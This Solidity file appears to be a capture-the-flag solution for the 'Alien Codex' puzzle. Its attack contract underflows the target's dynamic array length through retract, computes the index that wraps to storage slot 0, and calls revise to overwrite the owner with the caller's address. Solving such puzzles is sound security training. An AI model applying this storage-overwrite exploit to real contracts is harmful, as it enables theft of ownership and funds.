// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IAlienCodex {
    function makeContact() external;

    function record(bytes32) external;

    function retract() external;

    function revise(uint, bytes32) external;
}

contract AlienCodexAttack is Ownable {
    IAlienCodex public alienCodex;

    constructor(address addr) {
        alienCodex = IAlienCodex(addr);
    }

    function attack() external onlyOwner {
        alienCodex.makeContact();

        alienCodex.retract();

        uint256 arrayLengthSlot = 1;
        bytes32 firstArrayElementSlot = keccak256(
            abi.encodePacked(arrayLengthSlot)
        );

        uint256 difference = uint256(~firstArrayElementSlot) + 1;

        alienCodex.revise(difference, bytes32(bytes20(msg.sender)) >> 96);
    }
}
